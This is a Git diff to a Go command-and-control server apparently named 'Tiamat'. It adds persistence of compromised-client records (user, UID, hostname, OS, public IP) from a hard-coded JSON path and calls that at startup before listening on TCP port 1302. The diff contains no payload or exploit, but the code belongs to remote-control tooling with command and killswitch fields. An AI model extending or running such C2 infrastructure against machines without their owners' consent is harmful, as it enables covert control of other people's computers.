@@ -2,46 +2,21 @@ package cmd
 
 import (
 	"encoding/gob"
+	"encoding/json"
 	"fmt"
 	"log"
 	"net"
+	"os"
 	"time"
 
 	"github.com/spf13/viper"
 )
 
-type Client struct {
-	ClientBasicInfo
-	Conn     net.Conn
-	IsOnline bool
-	ClientID int
-}
-
-type ClientBasicInfo struct {
-	Username        string
-	UID             string
-	GID             string
-	OperatingSystem string
-	Hostname        string
-	PublicIP        string
-}
-
-type Instructions struct {
-	IsHeartbeat  bool
-	IsCommand    bool
-	IsKillswitch bool
-	Message      string
-}
-
-type Response struct {
-	Successful bool
-	Message    string
-}
-
 var (
-	C2Port     string = "1302"
-	clientList []Client
-	clientIDs  int = 0
+	C2Port         string = "1302"
+	clientList     []Client
+	clientIDs      int    = 0
+	clientJSONPath string = "/home/raul/.config/tiamat/clients.json"
 )
 
 func (c Client) Instruct(i Instructions) error {
@@ -53,12 +28,42 @@ func (c Client) Instruct(i Instructions) error {
 	return nil
 }
 
+func recoverClients() error {
+	clients := ClientJSON{}
+	file, err := os.Open(clientJSONPath)
+	if err != nil {
+		if os.IsNotExist(err) {
+			fmt.Println("CLIENTJSON DOES NOT EXIST")
+			return nil
+		}
+		return err
+	}
+	jsonParse := json.NewDecoder(file)
+	if err = jsonParse.Decode(&clients); err != nil {
+		return err
+	}
+	for _, v := range clients.List {
+		client := Client{}
+		client.ClientBasicInfo = v
+		client.IsOnline = false
+		client.ClientID = clientIDs
+		clientIDs++
+		clientList = append(clientList, client)
+	}
+	return nil
+}
+
 func Server() {
 	p := viper.GetString("Server.Port")
 	if p != "" {
 		C2Port = p
 	}
 	go WebServer()
+
+	if err := recoverClients(); err != nil {
+		log.Fatalf("Error happened recovering clients: %v\n", err)
+	}
+
 	log.SetPrefix("[TIAMAT] ")
 
 	ln, err := net.Listen("tcp", ":"+C2Port)
